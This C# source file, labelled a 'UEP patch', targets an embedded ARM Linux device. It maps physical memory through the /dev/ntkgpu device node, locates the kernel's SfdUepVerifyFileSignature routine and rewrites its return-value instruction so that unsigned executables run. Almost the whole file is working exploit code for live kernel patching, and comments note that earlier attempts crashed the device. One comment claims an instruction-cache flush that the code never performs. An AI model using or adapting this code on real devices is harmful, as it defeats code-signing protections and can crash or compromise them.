using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

// Safer UEP patch: instead of overwriting a function entry (which destroyed the
// prologue last time and took the device down), we only rewrite the single
// instruction that loads the return value, right before the function epilogue.
public static class UepFix2
{
    [DllImport("libc.so.6", EntryPoint = "open", SetLastError = true)]
    public static extern int open(string path, int flags);
    [DllImport("libc.so.6", EntryPoint = "mmap", SetLastError = true)]
    public static extern IntPtr mmap(IntPtr addr, uint len, int prot, int flags, int fd, int offset);
    [DllImport("libc.so.6", EntryPoint = "munmap")] public static extern int munmap(IntPtr addr, uint len);
    [DllImport("libc.so.6", EntryPoint = "close")] public static extern int close(int fd);
    [DllImport("libc.so.6", EntryPoint = "fork")] public static extern int fork();
    [DllImport("libc.so.6", EntryPoint = "write")] public static extern int write(int fd, byte[] buf, uint count);
    [DllImport("libc.so.6", EntryPoint = "open")] public static extern int open3(string path, int flags, int mode);
    [DllImport("libc.so.6", EntryPoint = "chmod")] public static extern int chmod(string path, int mode);
    [DllImport("libc.so.6", EntryPoint = "sched_setaffinity")]
    public static extern int sched_setaffinity(int pid, int len, IntPtr mask);
    [DllImport("libc.so.6", EntryPoint = "sysconf")]
    public static extern long sysconf(int name);
    [DllImport("libc.so.6", EntryPoint = "execve", SetLastError = true)]
    public static extern int execve(string path, IntPtr argv, IntPtr envp);
    [DllImport("libc.so.6", EntryPoint = "waitpid")] public static extern int waitpid(int pid, out int status, int options);
    [DllImport("libc.so.6", EntryPoint = "_exit")] public static extern void _exit(int code);
    [DllImport("libc.so.6", EntryPoint = "unlink")] public static extern int unlink(string path);
    [DllImport("libc.so.6", EntryPoint = "__errno_location")] public static extern IntPtr errno_location();
    static string RunShell(string cmd)
    {
        try
        {
            var psi = new System.Diagnostics.Process();
            psi.StartInfo.FileName = "/bin/sh";
            psi.StartInfo.Arguments = "-c \"" + cmd.Replace("\"", "'") + "\"";
            psi.StartInfo.RedirectStandardOutput = true;
            psi.StartInfo.UseShellExecute = false;
            psi.Start();
            string o = psi.StandardOutput.ReadToEnd();
            psi.WaitForExit(10000);
            return o;
        }
        catch (Exception e) { return "err: " + e.Message; }
    }

    const int O_RDWR = 2;
    const int PROT_READ = 1, PROT_WRITE = 2, MAP_SHARED = 1;
    const string DEV = "/dev/ntkgpu";
    const uint KERN_START = 0x02000000u;
    const uint SCAN_END = 0x08000000u;
    const uint MOV_R0_ZERO = 0xE3A00000u; // mov r0, #0
    const long SYS_CACHEFLUSH = 0x0F0001;  // ARM __ARM_NR_cacheflush (0x0f0002 is usr26!)
    const uint VIRT_BASE = 0xC0000000u;    // kernel virtual base (phys 0x02000000)
    const uint PHYS_BASE = 0x02000000u;

    [DllImport("libc.so.6", EntryPoint = "syscall")]
    public static extern long syscall4(long number, long a1, long a2, long a3);

    static void Log(string s)
    {
        try { File.AppendAllText("/tmp/managed_log.txt", s + "\n"); } catch { }
        Console.WriteLine(s);
    }

    static IntPtr MapPhys(uint phys, uint len)
    {
        uint page = phys & ~0xFFFu;
        uint delta = phys - page;
        int fd = open(DEV, O_RDWR);
        if (fd < 0) return new IntPtr(-1);
        IntPtr m = mmap(IntPtr.Zero, len + delta, PROT_READ | PROT_WRITE, MAP_SHARED, fd, unchecked((int)page));
        close(fd);
        if (m.ToInt64() == -1) return m;
        return new IntPtr(m.ToInt64() + delta);
    }

    static uint FindPattern(uint start, uint end, byte[] pat)
    {
        uint chunk = 0x400000;
        byte[] buf = new byte[chunk];
        for (uint p = start; p < end; p += chunk)
        {
            uint len = Math.Min(chunk, end - p);
            IntPtr m = MapPhys(p, len);
            if (m.ToInt64() == -1) continue;
            Marshal.Copy(m, buf, 0, (int)len);
            munmap(m, len);
            for (int i = 0; i + pat.Length <= (int)len; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (buf[i + j] != pat[j]) { ok = false; break; }
                if (ok) return p + (uint)i;
            }
        }
        return 0;
    }

    static uint FindPattern(uint start, uint end, string needle)
    {
        return FindPattern(start, end, Encoding.ASCII.GetBytes(needle));
    }

    static System.Collections.Generic.List<uint> RefsToLiteral(uint chunkStart, uint chunkLen, uint literalAddr)
    {
        var res = new System.Collections.Generic.List<uint>();
        IntPtr m = MapPhys(chunkStart, chunkLen);
        if (m.ToInt64() == -1) return res;
        uint n = chunkLen;
        for (uint off = 0; off + 4 <= n; off += 4)
        {
            uint instr = unchecked((uint)Marshal.ReadInt32(m, (int)off));
            if ((instr >> 28) != 0xE) continue;
            if (((instr >> 26) & 3) != 1) continue;
            if (((instr >> 25) & 1) != 0) continue;
            if (((instr >> 20) & 0x1F) != 0x19) continue;
            if (((instr >> 16) & 0xF) != 0xF) continue;
            uint imm = instr & 0xFFF;
            if (chunkStart + off + 8 + imm == literalAddr) res.Add(chunkStart + off);
        }
        munmap(m, n);
        return res;
    }

    static bool IsEpilogue(uint instr)
    {
        // LDM/STM block transfer with L=1 and pc in the register list -> "pop {..., pc}"
        bool block = (instr & 0x0E000000) == 0x08000000;
        bool load = (instr & 0x00100000) != 0;
        bool pcInList = (instr & 0x8000) != 0;
        if (block && load && pcInList) return true;
        if (instr == 0xE12FFF1E) return true;   // bx lr
        return false;
    }

    // instructions that put a value into r0 right before a return
    static bool IsR0Setter(uint instr, out bool isLdr)
    {
        isLdr = false;
        if ((instr & 0x0FFF0000) == 0x03A00000) return true;          // mov r0, #imm
        if ((instr & 0x0FFF0FF0) == 0x01A00000) return true;          // mov r0, rN
        if ((instr & 0x0FFF0000) == 0x059D0000) { isLdr = true; return true; } // ldr r0, [sp, #imm]
        return false;
    }

    static int _counter = 0;

    static int _cpu = 0;

    static bool PinCpu(int cpu)
    {
        IntPtr mask = Marshal.AllocHGlobal(128);
        for (int i = 0; i < 128; i++) Marshal.WriteByte(mask, i, 0);
        Marshal.WriteByte(mask, cpu / 8, (byte)(1 << (cpu % 8)));
        int rc = sched_setaffinity(0, 128, mask);
        Marshal.FreeHGlobal(mask);
        return rc == 0;
    }

    static bool TestExec(string elfPath)
    {
        unlink("/tmp/native_ran.txt");
        // SFD caches the verification result per inode, so every attempt needs a
        // fresh file (new inode) or the patched code path is never reached.
        string fresh = "/tmp/x" + (++_counter) + "_" + Environment.TickCount;
        try { File.Copy(elfPath, fresh, true); } catch (Exception e) { Log("copy failed: " + e.Message); return false; }
        chmod(fresh, 0755);   // without +x execve fails with EACCES before UEP is even reached
        PinCpu(_cpu);
        int pid = fork();
        if (pid == 0)
        {
            IntPtr argv = Marshal.AllocHGlobal(16);
            Marshal.WriteIntPtr(argv, 0, Marshal.StringToHGlobalAnsi(fresh));
            Marshal.WriteIntPtr(argv, 4, IntPtr.Zero);
            execve(fresh, argv, IntPtr.Zero);
            {
                int ex = Marshal.ReadInt32(errno_location());
                int fd = open3("/tmp/err", 0x241 /*O_WRONLY|O_CREAT|O_TRUNC*/, 0644);
                if (fd >= 0) { write(fd, BitConverter.GetBytes(ex), 4); close(fd); }
                _exit(ex & 0xff);   // exit code carries the errno
            }
            _exit(127);
        }
        if (pid < 0) return false;
        int status = 0;
        waitpid(pid, out status, 0);
        bool exited = (status & 0x7f) == 0;
        int code = (status >> 8) & 0xff;
        int sig = status & 0x7f;
        bool ran = File.Exists("/tmp/native_ran.txt");
        int err = -1;
        try { err = BitConverter.ToInt32(File.ReadAllBytes("/tmp/err"), 0); } catch { }
        Log("    exec test: exited=" + exited + " code=" + code + " signal=" + (exited ? 0 : sig) + " marker=" + ran + " errno=" + err + " (" + fresh + ")");
        Log("    dmesg: " + RunShell("dmesg | grep -E 'UEP|uep' | tail -2").Replace("\n", " | "));
        try { unlink(fresh); } catch { }
        return ran;
    }

    public static int Run(string[] args)
    {
        string funcName = args.Length > 1 ? args[1] : "SfdUepVerifyFileSignature";
        string elf = args.Length > 2 ? args[2] : "/tmp/tn";
        bool doPatch = args.Length > 3 && args[3] == "patch";
        Log("[fix2] function=" + funcName + " elf=" + elf + " patch=" + doPatch);

        uint pstr = FindPattern(KERN_START, SCAN_END, funcName);
        Log("[fix2] name string at phys 0x" + pstr.ToString("X8"));
        if (pstr == 0) { Log("[-] not found"); return 1; }

        // kernel virtual base is 0xC0000000 (verified earlier from the literal pool)
        uint virt = 0xC0000000u + (pstr - KERN_START);
        uint plit = FindPattern(KERN_START, SCAN_END, BitConverter.GetBytes(virt));
        Log("[fix2] virt=0x" + virt.ToString("X8") + " literal pool at phys 0x" + plit.ToString("X8"));
        if (plit == 0) { Log("[-] literal pool not found"); return 1; }

        var refs = new System.Collections.Generic.List<uint>();
        uint lo = (plit & 0xFFFFF000u) - 0x20000u;
        uint hi = (plit & 0xFFFFF000u) + 0x2000u;
        foreach (uint r in RefsToLiteral(lo, hi - lo, plit)) refs.Add(r);
        Log("[fix2] references: " + refs.Count);
        foreach (uint r in refs) Log("    ref 0x" + r.ToString("X8"));

        // recon: dump the code around each reference and list nearby epilogues
        foreach (uint r in refs)
        {
            IntPtr dm = MapPhys(r - 0x20, 0x200);
            if (dm.ToInt64() != -1)
            {
                var sb = new StringBuilder();
                for (uint off = 0; off < 0x200; off += 4)
                {
                    uint w = unchecked((uint)Marshal.ReadInt32(dm, (int)off));
                    sb.Append(w.ToString("X8")).Append(' ');
                    if (off % 32 == 28) { Log("    dump " + (r - 0x20 + off - 28).ToString("X8") + ": " + sb.ToString()); sb.Length = 0; }
                }
                if (sb.Length > 0) Log("    dump " + (r - 0x20).ToString("X8") + ": " + sb.ToString());
                munmap(dm, 0x200);
            }
            IntPtr em = MapPhys(r, 0x2000);
            if (em.ToInt64() != -1)
            {
                for (uint off = 0; off + 8 <= 0x2000; off += 4)
                {
                    uint instr = unchecked((uint)Marshal.ReadInt32(em, (int)off));
                    if (!IsEpilogue(instr)) continue;
                    uint p1 = unchecked((uint)Marshal.ReadInt32(em, (int)off - 4));
                    uint p2 = unchecked((uint)Marshal.ReadInt32(em, (int)off - 8));
                    Log("    epi at +0x" + off.ToString("X") + " (0x" + (r + off).ToString("X8") + ") prev=0x" + p1.ToString("X8") + " prev2=0x" + p2.ToString("X8"));
                }
                munmap(em, 0x2000);
            }
        }

        // collect return-value instructions: scan forward from each reference for an epilogue
        var candidates = new System.Collections.Generic.List<uint>();
        foreach (uint r in refs)
        {
            uint scanLen = 0x200;   // stay inside the function: a patch in a
            // neighbouring function crashed the kernel during an earlier attempt
            IntPtr m = MapPhys(r, scanLen);
            if (m.ToInt64() == -1) continue;
            for (uint off = 0; off + 8 <= scanLen; off += 4)
            {
                uint instr = unchecked((uint)Marshal.ReadInt32(m, (int)off));
                if (!IsEpilogue(instr)) continue;
                for (uint back = 4; back <= 12; back += 4)
                {
                    uint prev = unchecked((uint)Marshal.ReadInt32(m, (int)(off - back)));
                    bool ldr;
                    if (IsR0Setter(prev, out ldr))
                    {
                        uint addr = r + off - back;
                        if (!candidates.Contains(addr)) candidates.Add(addr);
                        break;
                    }
                }
            }
            munmap(m, scanLen);
        }
        Log("[fix2] return-value candidates: " + candidates.Count);
        foreach (uint c in candidates) Log("    cand 0x" + c.ToString("X8"));

        if (!doPatch) return 0;

        foreach (uint c in candidates)
        {
            IntPtr m = MapPhys(c, 4);
            if (m.ToInt64() == -1) continue;
            uint orig = unchecked((uint)Marshal.ReadInt32(m, 0));
            uint[] values = { 0u, 1u, 2u, 3u, 0xFFFFFFFFu };
            foreach (uint v in values)
            {
                Log("  trying 0x" + c.ToString("X8") + " (orig 0x" + orig.ToString("X8") + " -> mov r0,#" + v + ")");
                Marshal.WriteInt32(m, 0, unchecked((int)(MOV_R0_ZERO | (v & 0xFF))));
                // The CPU keeps the old instructions in its I-cache, so flush it
                // for the patched range (ARM cacheflush syscall).
                for (int cpu = 0; cpu < 4; cpu++)
                {
                    _cpu = cpu;
                    bool ok = TestExec(elf);
                    if (ok)
                    {
                        Log("[+] SUCCESS: patched 0x" + c.ToString("X8") + " -> mov r0,#" + v + " on cpu " + cpu + " ; unsigned ELF now runs");
                        return 0;
                    }
                }
                Marshal.WriteInt32(m, 0, unchecked((int)orig));
                Log("    restored 0x" + c.ToString("X8"));
            }
        }
        Log("[-] no candidate worked");
        return 2;
    }
}
